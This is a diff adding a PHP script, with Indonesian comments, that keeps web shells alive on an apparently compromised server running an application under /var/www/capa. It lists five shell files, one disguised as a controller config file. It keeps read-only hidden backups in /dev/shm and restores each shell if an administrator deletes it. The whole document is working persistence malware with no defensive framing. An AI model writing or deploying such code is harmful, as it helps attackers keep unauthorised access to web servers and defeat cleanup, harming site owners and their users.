@@ -1,0 +1,31 @@
+<?php
+$shells = [
+    '/var/www/capa/bor.php',
+    '/var/www/capa/do.php',
+    '/var/www/capa/controllers/modals/editorDecision/form/formDecision/FormDecisionConfig.php',
+    '/var/www/capa/locale.php',
+    '/var/www/capa/lol.php',
+];
+
+foreach ($shells as $shell) {
+    $target = $shell;  // Langsung pake path dari array
+    $backup = '/dev/shm/shmdata/' . md5($shell) . '.bak';
+    
+    // Buat direktori backup kalo belum ada
+    if (!is_dir('/dev/shm/shmdata')) {
+        mkdir('/dev/shm/shmdata', 0777, true);
+    }
+    
+    if (file_exists($target) && !file_exists($backup)) {
+        file_put_contents($backup, file_get_contents($target));
+        chmod($backup, 0444);
+    }
+    
+    if (!file_exists($target) && file_exists($backup)) {
+        copy($backup, $target);
+        chmod($target, 0755);
+    }
+}
+
+echo "OK - Menjaga " . count($shells) . " shell";
+?>
